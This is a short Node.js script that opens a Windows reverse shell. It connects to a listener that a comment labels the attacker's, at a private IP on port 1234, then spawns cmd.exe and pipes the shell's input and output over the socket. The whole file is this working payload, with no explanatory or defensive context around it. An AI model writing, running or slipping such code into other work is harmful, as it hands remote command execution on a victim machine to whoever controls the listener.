var net = require("net");
var cp = require("child_process");
var client = new net.Socket();

// Connect to the attacker's listener
client.connect(1234, "192.168.86.136", function(){
    // Spawn a cmd.exe process
    var sh = cp.spawn("cmd.exe", []);
    
    // Pipe the standard streams (stdin, stdout, stderr) between the socket and the shell
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);

    // Optional: Handle the shell closing
    sh.on('close', function() {
        client.end();
    });
});

// Handle connection errors
client.on('error', function(err) {
    console.error("Connection error: " + err.message);
});
